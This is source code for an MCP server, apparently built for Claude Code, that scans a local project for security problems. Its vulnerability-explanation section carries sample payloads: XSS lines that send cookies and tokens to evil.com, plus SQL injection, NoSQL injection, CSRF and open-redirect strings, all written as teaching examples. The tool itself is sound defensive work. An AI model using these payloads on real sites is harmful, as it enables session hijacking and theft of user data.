#!/usr/bin/env node

/**
 * Guardian-Agent MCP Server
 *
 * This is the MCP (Model Context Protocol) server that handles tool calls
 * from Claude Code. It provides comprehensive security scanning capabilities
 * scoped to the user's local project only.
 */

import { readFile } from 'fs/promises';
import { join } from 'path';

// Import our comprehensive scanner modules
import { StackDetector } from '../src/analyzers/stack-detector.js';
import { StaticAnalyzer } from '../src/analyzers/static.js';
import { FrameworkSecurityAnalyzer } from '../src/analyzers/framework-security.js';
import { DatabaseSecurityAnalyzer } from '../src/analyzers/database-security.js';
import { AuthSecurityAnalyzer } from '../src/analyzers/auth-security.js';
import { APISecurityAnalyzer } from '../src/analyzers/api-security.js';
import { DependencySecurityAnalyzer } from '../src/analyzers/dependency-security.js';
import { LiveCVEChecker, ReactSecurityChecker } from '../src/analyzers/live-cve-checker.js';
import { OAuthSecurityAnalyzer } from '../src/analyzers/oauth-security.js';
import { ConfigAuditor } from '../src/auditors/config.js';
import { SafeChecker } from '../src/auditors/safe-checks.js';
import { Reporter } from '../src/reporters/json-reporter.js';

// User-friendly tools
import { SecurityScoreCalculator } from '../src/tools/security-score.js';
import { EnvAuditor } from '../src/tools/env-auditor.js';
import { SecurityFixGenerator } from '../src/tools/security-fix-generator.js';
import { PreCommitHookGenerator } from '../src/tools/pre-commit-hook.js';
import { GitHubUpdater } from '../src/tools/github-updater.js';

/**
 * MCP Server for Guardian-Agent
 */
class GuardianMCPServer {
  constructor() {
    // Always scope to current working directory
    this.projectPath = process.cwd();
    this.findings = [];
    this.detectedStack = null;

    this.stackDetector = new StackDetector(this.projectPath);
    this.staticAnalyzer = new StaticAnalyzer(this.projectPath);
    this.configAuditor = new ConfigAuditor(this.projectPath);
    this.dependencyAnalyzer = new DependencySecurityAnalyzer(this.projectPath);
    this.safeChecker = new SafeChecker({
      // IMPORTANT: Only allow localhost
      allowedHosts: ['localhost', '127.0.0.1'],
      defaultPort: 3000
    });
    this.reporter = new Reporter();
  }

  /**
   * Handle incoming MCP tool calls
   */
  async handleToolCall(toolName, params) {
    switch (toolName) {
      case 'detect_tech_stack':
        return await this.detectTechStack(params);

      case 'run_full_scan':
        return await this.runFullScan(params);

      case 'scan_project_security':
        return await this.scanProjectSecurity(params);

      case 'scan_framework_security':
        return await this.scanFrameworkSecurity(params);

      case 'scan_database_security':
        return await this.scanDatabaseSecurity(params);

      case 'scan_auth_security':
        return await this.scanAuthSecurity(params);

      case 'scan_api_security':
        return await this.scanAPISecurity(params);

      case 'scan_dependencies':
        return await this.scanDependencies(params);

      case 'audit_database_config':
        return await this.auditDatabaseConfig(params);

      case 'check_localhost_headers':
        return await this.checkLocalhostHeaders(params);

      case 'generate_security_report':
        return await this.generateReport(params);

      case 'check_live_cves':
        return await this.checkLiveCVEs(params);

      case 'check_react_vulnerabilities':
        return await this.checkReactVulnerabilities(params);

      // User-friendly tools
      case 'security_score':
        return await this.getSecurityScore(params);

      case 'audit_env_files':
        return await this.auditEnvFiles(params);

      case 'generate_env_example':
        return await this.generateEnvExample(params);

      case 'generate_security_fix':
        return await this.generateSecurityFix(params);

      case 'generate_pre_commit_hook':
        return await this.generatePreCommitHook(params);

      case 'install_pre_commit_hook':
        return await this.installPreCommitHook(params);

      case 'explain_vulnerability':
        return await this.explainVulnerability(params);

      case 'scan_oauth_security':
        return await this.scanOAuthSecurity(params);

      // Update tools
      case 'check_for_updates':
        return await this.checkForUpdates(params);

      case 'update_guardian_agent':
        return await this.updateGuardianAgent(params);

      case 'update_vuln_databases':
        return await this.updateVulnDatabases(params);

      default:
        return { error: `Unknown tool: ${toolName}` };
    }
  }

  /**
   * Check live CVE databases for vulnerabilities
   */
  async checkLiveCVEs(params = {}) {
    console.error(`[Guardian] Checking live CVE databases...`);

    const checker = new LiveCVEChecker(this.projectPath);
    const results = await checker.checkLiveVulnerabilities();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      source: 'OSV (Google Open Source Vulnerabilities)',
      packages_checked: results.packagesChecked,
      vulnerabilities_found: results.vulnerabilitiesFound,
      findings: results.findings,
      note: 'Data fetched from live vulnerability databases. Results are current as of this scan.'
    };
  }

  /**
   * Check React ecosystem for vulnerabilities
   */
  async checkReactVulnerabilities(params = {}) {
    console.error(`[Guardian] Checking React ecosystem vulnerabilities...`);

    const checker = new ReactSecurityChecker(this.projectPath);
    const results = await checker.check();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: results.summary,
      checked_packages: [
        'react', 'react-dom', 'next', 'react-router', '@remix-run/react',
        'react-query', 'styled-components', 'react-hook-form', 'formik'
      ]
    };
  }

  /**
   * Detect tech stack
   */
  async detectTechStack(params = {}) {
    console.error(`[Guardian] Detecting tech stack in: ${this.projectPath}`);

    const result = await this.stackDetector.detect();
    this.detectedStack = result.stack;

    return {
      success: true,
      project_path: this.projectPath,
      stack: result.stack,
      summary: result.summary,
      confidence: result.confidence,
      config_files_found: Object.keys(result.configFiles)
    };
  }

  /**
   * Run full comprehensive scan
   */
  async runFullScan(params = {}) {
    console.error(`[Guardian] Running full comprehensive scan on: ${this.projectPath}`);

    // First detect stack
    const stackResult = await this.stackDetector.detect();
    this.detectedStack = stackResult.stack;

    const allFindings = [];
    const phases = {};

    // 1. Dependencies
    console.error('[Guardian] Scanning dependencies...');
    phases.dependencies = await this.dependencyAnalyzer.analyze();
    allFindings.push(...phases.dependencies.findings);

    // 2. Static analysis
    console.error('[Guardian] Running static analysis...');
    phases.static = await this.staticAnalyzer.analyze();
    allFindings.push(...phases.static.findings);

    // 3. Framework security
    console.error('[Guardian] Checking framework security...');
    const frameworkAnalyzer = new FrameworkSecurityAnalyzer(this.projectPath, this.detectedStack);
    phases.framework = await frameworkAnalyzer.analyze();
    allFindings.push(...phases.framework.findings);

    // 4. Database security (if databases detected)
    if (this.detectedStack.database?.length > 0) {
      console.error('[Guardian] Checking database security...');
      const dbAnalyzer = new DatabaseSecurityAnalyzer(this.projectPath, this.detectedStack);
      phases.database = await dbAnalyzer.analyze();
      allFindings.push(...phases.database.findings);
    }

    // 5. Auth security (if auth detected)
    if (this.detectedStack.auth?.length > 0) {
      console.error('[Guardian] Checking auth security...');
      const authAnalyzer = new AuthSecurityAnalyzer(this.projectPath, this.detectedStack);
      phases.auth = await authAnalyzer.analyze();
      allFindings.push(...phases.auth.findings);
    }

    // 6. API security (if APIs detected)
    if (this.detectedStack.api?.length > 0) {
      console.error('[Guardian] Checking API security...');
      const apiAnalyzer = new APISecurityAnalyzer(this.projectPath, this.detectedStack);
      phases.api = await apiAnalyzer.analyze();
      allFindings.push(...phases.api.findings);
    }

    // 7. Config audit
    console.error('[Guardian] Auditing configuration...');
    phases.config = await this.configAuditor.audit();
    allFindings.push(...phases.config.findings);

    // Store findings
    this.findings = this.deduplicateFindings(allFindings);

    // Generate summary
    const summary = this.generateSummary(this.findings);

    return {
      success: true,
      project_path: this.projectPath,
      detected_stack: stackResult.summary.text,
      phases_run: Object.keys(phases),
      total_findings: this.findings.length,
      summary,
      findings: this.findings.slice(0, 50), // Limit to first 50 for response size
      has_more: this.findings.length > 50
    };
  }

  /**
   * Scan project source code for vulnerabilities
   */
  async scanProjectSecurity(params = {}) {
    const scanType = params.scan_type || 'full';

    console.error(`[Guardian] Scanning project: ${this.projectPath}`);
    console.error(`[Guardian] Scan type: ${scanType}`);

    const results = await this.staticAnalyzer.analyze();

    // Filter results based on scan type
    let filteredFindings = results.findings;

    if (scanType === 'secrets') {
      filteredFindings = results.findings.filter(f =>
        f.category === 'hardcodedSecrets'
      );
    } else if (scanType === 'injection') {
      filteredFindings = results.findings.filter(f =>
        ['sqlInjection', 'nosqlInjection', 'codeExecution'].includes(f.category)
      );
    } else if (scanType === 'xss') {
      filteredFindings = results.findings.filter(f =>
        f.category === 'xssRisks'
      );
    }

    this.findings = [...this.findings, ...filteredFindings];

    return {
      success: true,
      scan_type: scanType,
      project_path: this.projectPath,
      files_scanned: results.scannedFiles,
      findings_count: filteredFindings.length,
      findings: filteredFindings.map(f => ({
        severity: f.severity,
        title: f.title,
        description: f.description,
        location: f.location,
        remediation: f.remediation
      })),
      summary: this.generateSummary(filteredFindings)
    };
  }

  /**
   * Scan framework-specific security
   */
  async scanFrameworkSecurity(params = {}) {
    console.error(`[Guardian] Scanning framework security...`);

    // Detect stack if not already done
    if (!this.detectedStack) {
      const stackResult = await this.stackDetector.detect();
      this.detectedStack = stackResult.stack;
    }

    const frameworkAnalyzer = new FrameworkSecurityAnalyzer(this.projectPath, this.detectedStack);
    const results = await frameworkAnalyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      analyzed_frameworks: results.analyzedFrameworks,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: this.generateSummary(results.findings)
    };
  }

  /**
   * Scan database security
   */
  async scanDatabaseSecurity(params = {}) {
    console.error(`[Guardian] Scanning database security...`);

    // Detect stack if not already done
    if (!this.detectedStack) {
      const stackResult = await this.stackDetector.detect();
      this.detectedStack = stackResult.stack;
    }

    const dbAnalyzer = new DatabaseSecurityAnalyzer(this.projectPath, this.detectedStack);
    const results = await dbAnalyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      analyzed_databases: results.analyzedDatabases,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: this.generateSummary(results.findings)
    };
  }

  /**
   * Scan authentication security
   */
  async scanAuthSecurity(params = {}) {
    console.error(`[Guardian] Scanning auth security...`);

    // Detect stack if not already done
    if (!this.detectedStack) {
      const stackResult = await this.stackDetector.detect();
      this.detectedStack = stackResult.stack;
    }

    const authAnalyzer = new AuthSecurityAnalyzer(this.projectPath, this.detectedStack);
    const results = await authAnalyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      analyzed_auth_providers: results.analyzedAuthProviders,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: this.generateSummary(results.findings)
    };
  }

  /**
   * Scan API security
   */
  async scanAPISecurity(params = {}) {
    console.error(`[Guardian] Scanning API security...`);

    // Detect stack if not already done
    if (!this.detectedStack) {
      const stackResult = await this.stackDetector.detect();
      this.detectedStack = stackResult.stack;
    }

    const apiAnalyzer = new APISecurityAnalyzer(this.projectPath, this.detectedStack);
    const results = await apiAnalyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      analyzed_apis: results.analyzedAPIs,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: this.generateSummary(results.findings)
    };
  }

  /**
   * Scan dependencies for vulnerabilities
   */
  async scanDependencies(params = {}) {
    console.error(`[Guardian] Scanning dependencies...`);

    const results = await this.dependencyAnalyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: results.summary
    };
  }

  /**
   * Audit database configuration
   */
  async auditDatabaseConfig(params = {}) {
    const dbType = params.db_type || 'auto';

    console.error(`[Guardian] Auditing database config: ${dbType}`);

    // Detect database type if auto
    let detectedType = dbType;
    if (dbType === 'auto') {
      detectedType = await this.detectDatabaseType();
    }

    const results = await this.configAuditor.audit();

    // Filter to database-relevant findings
    const dbFindings = results.findings.filter(f => {
      const title = f.title.toLowerCase();
      if (detectedType === 'supabase') {
        return title.includes('supabase') || title.includes('rls') || title.includes('jwt');
      }
      if (detectedType === 'mongodb') {
        return title.includes('mongo') || title.includes('nosql');
      }
      return true;
    });

    this.findings = [...this.findings, ...dbFindings];

    return {
      success: true,
      detected_db_type: detectedType,
      findings_count: dbFindings.length,
      findings: dbFindings,
      recommendations: this.getDatabaseRecommendations(detectedType)
    };
  }

  /**
   * Check localhost security headers
   */
  async checkLocalhostHeaders(params = {}) {
    const port = params.port || 3000;

    // SECURITY: Only allow localhost
    const targetUrl = `http://localhost:${port}`;

    console.error(`[Guardian] Checking headers at: ${targetUrl}`);

    const results = await this.safeChecker.runChecks(targetUrl);

    if (results.error) {
      return {
        success: false,
        error: results.error,
        message: 'Header checks are restricted to localhost only.'
      };
    }

    if (results.message) {
      return {
        success: false,
        message: results.message,
        hint: `Start your dev server on port ${port} and try again.`
      };
    }

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      target: targetUrl,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: results.summary
    };
  }

  /**
   * Generate formatted security report
   */
  async generateReport(params = {}) {
    const format = params.format || 'markdown';

    const report = this.reporter.generate(this.findings);

    if (format === 'json') {
      return { success: true, format: 'json', report };
    }

    if (format === 'markdown') {
      return {
        success: true,
        format: 'markdown',
        report: this.reporter.toMarkdown(report)
      };
    }

    if (format === 'sarif') {
      return {
        success: true,
        format: 'sarif',
        report: this.toSarif(report)
      };
    }

    return { success: true, report };
  }

  /**
   * Detect database type from project files
   */
  async detectDatabaseType() {
    try {
      const packageJson = await readFile(join(this.projectPath, 'package.json'), 'utf-8');
      const pkg = JSON.parse(packageJson);
      const deps = { ...pkg.dependencies, ...pkg.devDependencies };

      if (deps['@supabase/supabase-js']) return 'supabase';
      if (deps['mongoose'] || deps['mongodb']) return 'mongodb';
      if (deps['pg'] || deps['postgres']) return 'postgres';
      if (deps['prisma'] || deps['@prisma/client']) return 'prisma';
      if (deps['firebase'] || deps['firebase-admin']) return 'firebase';

      return 'unknown';
    } catch {
      return 'unknown';
    }
  }

  /**
   * Get database-specific recommendations
   */
  getDatabaseRecommendations(dbType) {
    const recommendations = {
      supabase: [
        'Enable Row Level Security (RLS) on all tables',
        'Create policies that restrict data access by user ID',
        'Never expose service_role key to the client',
        'Use getUser() instead of getSession() for server-side auth checks',
        'Validate user input before database operations'
      ],
      mongodb: [
        'Enable authentication on your MongoDB instance',
        'Use parameterized queries to prevent injection',
        'Sanitize user input - watch for $where and $regex operators',
        'Never use $where with user input',
        'Use MongoDB Atlas with network access controls'
      ],
      postgres: [
        'Use parameterized queries ($1, $2 placeholders)',
        'Implement row-level security policies',
        'Use least-privilege database roles',
        'Enable SSL for database connections',
        'Never concatenate user input into SQL strings'
      ],
      firebase: [
        'Write proper Firestore security rules',
        'Check request.auth != null for authenticated routes',
        'Use verifyIdToken() for server-side auth',
        'Never trust client-side auth state on the server'
      ],
      unknown: [
        'Identify your database type for specific recommendations',
        'Always use parameterized queries',
        'Implement proper authentication and authorization',
        'Encrypt sensitive data at rest and in transit'
      ]
    };

    return recommendations[dbType] || recommendations.unknown;
  }

  /**
   * Generate summary from findings
   */
  generateSummary(findings) {
    const summary = {
      critical: 0, high: 0, medium: 0, low: 0, info: 0
    };

    for (const f of findings) {
      summary[f.severity]++;
    }

    return summary;
  }

  /**
   * Deduplicate findings
   */
  deduplicateFindings(findings) {
    const seen = new Set();
    return findings.filter(f => {
      const key = `${f.title}:${f.location?.file || ''}:${f.location?.line || ''}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  /**
   * Convert report to SARIF format
   */
  toSarif(report) {
    return {
      $schema: 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
      version: '2.1.0',
      runs: [{
        tool: {
          driver: {
            name: 'Guardian-Agent',
            version: '1.0.0',
            informationUri: 'https://github.com/naieum/ChiefWiggum'
          }
        },
        results: report.findings.map(f => ({
          ruleId: f.id,
          level: this.severityToSarif(f.severity),
          message: { text: f.description },
          locations: f.location?.file ? [{
            physicalLocation: {
              artifactLocation: { uri: f.location.file },
              region: { startLine: f.location.line || 1 }
            }
          }] : []
        }))
      }]
    };
  }

  severityToSarif(severity) {
    const map = { critical: 'error', high: 'error', medium: 'warning', low: 'note', info: 'note' };
    return map[severity] || 'note';
  }

  // ============================================
  // User-Friendly Tools
  // ============================================

  /**
   * Calculate security score (A-F grade)
   */
  async getSecurityScore(params = {}) {
    console.error(`[Guardian] Calculating security score...`);

    // Run a full scan if we don't have findings
    if (this.findings.length === 0) {
      await this.runFullScan({});
    }

    const calculator = new SecurityScoreCalculator(this.projectPath);
    const result = calculator.calculate(this.findings);

    return {
      success: true,
      score: result.score,
      grade: result.grade,
      emoji: result.gradeEmoji,
      summary: result.summary,
      breakdown: result.breakdown,
      top_issues: result.topIssues,
      recommendations: result.recommendations,
      ascii_card: calculator.toAsciiCard(result)
    };
  }

  /**
   * Audit environment files
   */
  async auditEnvFiles(params = {}) {
    console.error(`[Guardian] Auditing environment files...`);

    const auditor = new EnvAuditor(this.projectPath);
    const result = await auditor.audit();

    this.findings = [...this.findings, ...result.findings];

    return {
      success: true,
      files_audited: result.filesAudited,
      findings_count: result.findings.length,
      findings: result.findings,
      summary: result.summary
    };
  }

  /**
   * Generate .env.example from existing .env
   */
  async generateEnvExample(params = {}) {
    console.error(`[Guardian] Generating .env.example...`);

    const auditor = new EnvAuditor(this.projectPath);
    const result = await auditor.generateEnvExample();

    if (result.error) {
      return { success: false, error: result.error };
    }

    return {
      success: true,
      source_file: result.sourceFile,
      content: result.content,
      instructions: 'Save this content to .env.example and commit to version control.'
    };
  }

  /**
   * Generate fix for a specific vulnerability
   */
  async generateSecurityFix(params = {}) {
    const { finding_index, finding_title } = params;

    console.error(`[Guardian] Generating security fix...`);

    // Find the relevant finding
    let finding = null;
    if (finding_index !== undefined && this.findings[finding_index]) {
      finding = this.findings[finding_index];
    } else if (finding_title) {
      finding = this.findings.find(f =>
        f.title.toLowerCase().includes(finding_title.toLowerCase())
      );
    } else if (this.findings.length > 0) {
      // Default to first critical/high finding
      finding = this.findings.find(f => f.severity === 'critical') ||
                this.findings.find(f => f.severity === 'high') ||
                this.findings[0];
    }

    if (!finding) {
      return {
        success: false,
        error: 'No finding specified or found. Run a scan first.'
      };
    }

    const generator = new SecurityFixGenerator(this.projectPath);
    const fix = await generator.generateFix(finding);

    return {
      success: true,
      finding: {
        severity: finding.severity,
        title: finding.title,
        location: finding.location
      },
      fix
    };
  }

  /**
   * Generate pre-commit hook
   */
  async generatePreCommitHook(params = {}) {
    console.error(`[Guardian] Generating pre-commit hook...`);

    const generator = new PreCommitHookGenerator(this.projectPath);
    const result = await generator.generate(params);

    return {
      success: true,
      hook_content: result.hookContent,
      instructions: result.instructions,
      husky_config: result.huskyConfig,
      lint_staged_config: result.lintStagedConfig
    };
  }

  /**
   * Install pre-commit hook directly
   */
  async installPreCommitHook(params = {}) {
    console.error(`[Guardian] Installing pre-commit hook...`);

    const generator = new PreCommitHookGenerator(this.projectPath);
    const result = await generator.install(params);

    return result;
  }

  /**
   * Explain a vulnerability in simple terms
   */
  async explainVulnerability(params = {}) {
    const { vulnerability_type } = params;

    const explanations = {
      'sql-injection': {
        name: 'SQL Injection',
        simple: 'Attackers can run their own database commands through your app.',
        how_it_works: 'When user input is directly put into SQL queries, attackers can add their own SQL code.',
        example_attack: "Input: ' OR '1'='1' -- turns SELECT * FROM users WHERE id='INPUT' into SELECT * FROM users WHERE id='' OR '1'='1' --'",
        impact: 'Attackers can read, modify, or delete all your database data.',
        fix: 'Always use parameterized queries. Never concatenate user input into SQL.',
        difficulty: 'Easy to exploit, easy to fix'
      },
      'xss': {
        name: 'Cross-Site Scripting (XSS)',
        simple: 'Attackers can run JavaScript in your users\' browsers.',
        how_it_works: 'When user input is displayed as HTML without escaping, attackers can inject scripts.',
        example_attack: 'Input: <script>document.location="evil.com?cookie="+document.cookie</script>',
        impact: 'Attackers can steal cookies, hijack sessions, or deface your site.',
        fix: 'Always escape HTML output. Use textContent instead of innerHTML.',
        difficulty: 'Easy to exploit, easy to fix'
      },
      'hardcoded-secrets': {
        name: 'Hardcoded Secrets',
        simple: 'Passwords and API keys are stored in your code where anyone can see them.',
        how_it_works: 'Secrets in source code get committed to git and may be exposed publicly.',
        example_attack: 'Attacker finds your GitHub repo and searches for "API_KEY" or "password".',
        impact: 'Attackers gain access to your services, databases, or third-party APIs.',
        fix: 'Move secrets to environment variables. Add .env to .gitignore.',
        difficulty: 'Very easy to exploit, easy to fix'
      },
      'missing-auth': {
        name: 'Missing Authentication',
        simple: 'Some pages or APIs can be accessed without logging in.',
        how_it_works: 'Protected resources don\'t check if the user is authenticated.',
        example_attack: 'Attacker directly visits /admin/users without logging in.',
        impact: 'Unauthorized access to sensitive data or admin functions.',
        fix: 'Add authentication middleware to all protected routes.',
        difficulty: 'Very easy to exploit, easy to fix'
      },
      'nosql-injection': {
        name: 'NoSQL Injection',
        simple: 'Attackers can manipulate MongoDB queries to access unauthorized data.',
        how_it_works: 'MongoDB operators like $gt, $ne can be injected through JSON input.',
        example_attack: 'Input: {"$gt": ""} matches all documents instead of one.',
        impact: 'Attackers can bypass authentication or access all data.',
        fix: 'Validate input types. Use express-mongo-sanitize middleware.',
        difficulty: 'Easy to exploit, easy to fix'
      },
      'csrf': {
        name: 'Cross-Site Request Forgery',
        simple: 'Attackers can make your users perform actions without knowing.',
        how_it_works: 'Malicious sites can trigger requests to your site using the user\'s cookies.',
        example_attack: '<img src="yoursite.com/api/delete-account"> on an evil site.',
        impact: 'Users unknowingly perform actions like transfers or deletions.',
        fix: 'Use CSRF tokens. Check Origin/Referer headers.',
        difficulty: 'Medium to exploit, medium to fix'
      },
      'oauth-csrf': {
        name: 'OAuth CSRF (Missing State Parameter)',
        simple: 'Attackers can link their account to your users\' sessions.',
        how_it_works: 'Without state parameter, attacker initiates OAuth flow, gets their callback URL, tricks victim into visiting it.',
        example_attack: 'Attacker sends victim link: yoursite.com/callback?code=ATTACKERS_CODE. Victim\'s session gets attacker\'s account linked.',
        impact: 'Account takeover, data theft, attacker gains access as the victim.',
        fix: 'Generate random state, store in session before OAuth, verify on callback.',
        difficulty: 'Medium to exploit, easy to fix'
      },
      'open-redirect': {
        name: 'Open Redirect',
        simple: 'Your site can be used to redirect users to malicious sites.',
        how_it_works: 'If redirect URLs aren\'t validated, attackers craft links that appear to be your site but redirect elsewhere.',
        example_attack: 'yoursite.com/login?redirect=https://evil.com - looks legitimate but goes to phishing site.',
        impact: 'Phishing attacks, credential theft, malware distribution.',
        fix: 'Validate redirect URLs against an allowlist of trusted domains.',
        difficulty: 'Easy to exploit, easy to fix'
      },
      'token-storage': {
        name: 'Insecure Token Storage',
        simple: 'Auth tokens stored where JavaScript can access them can be stolen.',
        how_it_works: 'localStorage/sessionStorage tokens can be read by any script, including XSS payloads.',
        example_attack: 'XSS payload: fetch("evil.com?token="+localStorage.getItem("token"))',
        impact: 'Session hijacking, account takeover.',
        fix: 'Store tokens in httpOnly cookies. Use refresh token rotation.',
        difficulty: 'Requires XSS first, easy to fix'
      },
      'pkce': {
        name: 'Missing PKCE',
        simple: 'Authorization codes can be intercepted and used by attackers.',
        how_it_works: 'In SPAs/mobile apps, authorization code can be intercepted. PKCE proves you started the flow.',
        example_attack: 'Malicious app intercepts redirect, steals auth code, exchanges it for tokens.',
        impact: 'Account takeover via intercepted authorization codes.',
        fix: 'Implement PKCE: generate code_verifier, send code_challenge, verify on exchange.',
        difficulty: 'Medium to exploit, medium to fix'
      }
    };

    const type = vulnerability_type?.toLowerCase().replace(/\s+/g, '-');
    const explanation = explanations[type];

    if (!explanation) {
      return {
        success: true,
        available_types: Object.keys(explanations),
        message: 'Specify a vulnerability_type parameter. Available types listed above.'
      };
    }

    return {
      success: true,
      vulnerability: explanation
    };
  }

  /**
   * Scan OAuth/authentication security
   */
  async scanOAuthSecurity(params = {}) {
    console.error(`[Guardian] Scanning OAuth security...`);

    // Detect stack if not already done
    if (!this.detectedStack) {
      const stackResult = await this.stackDetector.detect();
      this.detectedStack = stackResult.stack;
    }

    const analyzer = new OAuthSecurityAnalyzer(this.projectPath, this.detectedStack);
    const results = await analyzer.analyze();

    this.findings = [...this.findings, ...results.findings];

    return {
      success: true,
      analyzed_providers: results.analyzedProviders,
      findings_count: results.findings.length,
      findings: results.findings,
      summary: results.summary,
      oauth_checklist: {
        state_parameter: 'Prevents CSRF attacks during OAuth flow',
        pkce: 'Required for public clients (SPAs, mobile apps)',
        token_storage: 'Use httpOnly cookies, not localStorage',
        redirect_validation: 'Validate redirect URLs against allowlist',
        secret_management: 'Never expose client secrets to browser'
      }
    };
  }

  // ============================================
  // Update Tools
  // ============================================

  /**
   * Check for updates from GitHub
   */
  async checkForUpdates(params = {}) {
    console.error(`[Guardian] Checking for updates...`);

    const updater = new GitHubUpdater(this.projectPath);
    const result = await updater.checkForUpdates();

    return result;
  }

  /**
   * Update Guardian-Agent from GitHub
   */
  async updateGuardianAgent(params = {}) {
    console.error(`[Guardian] Updating from GitHub...`);

    const updater = new GitHubUpdater(this.projectPath);
    const result = await updater.update(params);

    return result;
  }

  /**
   * Update only vulnerability databases
   */
  async updateVulnDatabases(params = {}) {
    console.error(`[Guardian] Updating vulnerability databases...`);

    const updater = new GitHubUpdater(this.projectPath);
    const result = await updater.updateVulnDatabases();

    return result;
  }
}

/**
 * MCP Protocol Handler
 */
async function main() {
  const server = new GuardianMCPServer();

  process.stdin.setEncoding('utf-8');
  let buffer = '';

  process.stdin.on('data', async (chunk) => {
    buffer += chunk;
    const lines = buffer.split('\n');
    buffer = lines.pop() || '';

    for (const line of lines) {
      if (!line.trim()) continue;

      try {
        const request = JSON.parse(line);

        if (request.method === 'tools/call') {
          const { name, arguments: args } = request.params;
          const result = await server.handleToolCall(name, args || {});

          const response = {
            jsonrpc: '2.0',
            id: request.id,
            result: { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] }
          };

          process.stdout.write(JSON.stringify(response) + '\n');
        }

        if (request.method === 'initialize') {
          const response = {
            jsonrpc: '2.0',
            id: request.id,
            result: {
              protocolVersion: '2024-11-05',
              capabilities: { tools: {} },
              serverInfo: { name: 'guardian-agent', version: '1.0.0' }
            }
          };
          process.stdout.write(JSON.stringify(response) + '\n');
        }

        if (request.method === 'tools/list') {
          const response = {
            jsonrpc: '2.0',
            id: request.id,
            result: {
              tools: [
                {
                  name: 'detect_tech_stack',
                  description: 'Detects all technologies used in the project (frameworks, databases, auth, etc.)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'run_full_scan',
                  description: 'Runs a comprehensive security scan covering all categories',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'scan_project_security',
                  description: 'Scans source code for vulnerabilities (SQLi, XSS, secrets, etc.)',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      scan_type: { type: 'string', enum: ['full', 'secrets', 'injection', 'xss'] }
                    }
                  }
                },
                {
                  name: 'scan_framework_security',
                  description: 'Framework-specific security checks (Next.js, React, Express, Django, etc.)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'scan_database_security',
                  description: 'Database-specific security checks (Supabase RLS, MongoDB injection, etc.)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'scan_auth_security',
                  description: 'Authentication security checks (JWT, sessions, passwords, OAuth)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'scan_api_security',
                  description: 'API security checks (rate limiting, validation, CORS, error handling)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'scan_dependencies',
                  description: 'Checks for vulnerable dependencies',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'check_localhost_headers',
                  description: 'Checks HTTP security headers on localhost dev server',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      port: { type: 'integer', default: 3000 }
                    }
                  }
                },
                {
                  name: 'generate_security_report',
                  description: 'Generates a formatted security report from findings',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      format: { type: 'string', enum: ['json', 'markdown', 'sarif'] }
                    }
                  }
                },
                {
                  name: 'check_live_cves',
                  description: 'Fetches LIVE vulnerability data from OSV database (always up-to-date)',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'check_react_vulnerabilities',
                  description: 'Checks React ecosystem packages for known vulnerabilities (react, next.js, react-router, etc.)',
                  inputSchema: { type: 'object', properties: {} }
                },
                // User-friendly tools
                {
                  name: 'security_score',
                  description: 'Get a simple A-F security grade for your project with top issues to fix',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'audit_env_files',
                  description: 'Check .env files for exposed secrets and security issues',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'generate_env_example',
                  description: 'Generate a safe .env.example file from your existing .env',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'generate_security_fix',
                  description: 'Auto-generate code to fix a specific vulnerability',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      finding_index: { type: 'integer', description: 'Index of finding from scan results' },
                      finding_title: { type: 'string', description: 'Title of finding to fix' }
                    }
                  }
                },
                {
                  name: 'generate_pre_commit_hook',
                  description: 'Generate a git pre-commit hook to prevent committing secrets',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      checkSecrets: { type: 'boolean', default: true },
                      checkEnvFiles: { type: 'boolean', default: true },
                      checkDebugCode: { type: 'boolean', default: true }
                    }
                  }
                },
                {
                  name: 'install_pre_commit_hook',
                  description: 'Install the security pre-commit hook directly into .git/hooks',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      force: { type: 'boolean', description: 'Overwrite existing hook' }
                    }
                  }
                },
                {
                  name: 'explain_vulnerability',
                  description: 'Get a simple explanation of a vulnerability type (sql-injection, xss, etc.)',
                  inputSchema: {
                    type: 'object',
                    properties: {
                      vulnerability_type: { type: 'string', description: 'Type: sql-injection, xss, hardcoded-secrets, nosql-injection, csrf, missing-auth' }
                    }
                  }
                },
                {
                  name: 'scan_oauth_security',
                  description: 'Scan OAuth/social login implementation for security issues (NextAuth, Clerk, Supabase, Firebase, Auth0, Passport)',
                  inputSchema: { type: 'object', properties: {} }
                },
                // Update tools
                {
                  name: 'check_for_updates',
                  description: 'Check if a newer version of Guardian-Agent is available on GitHub',
                  inputSchema: { type: 'object', properties: {} }
                },
                {
                  name: 'update_guardian_agent',
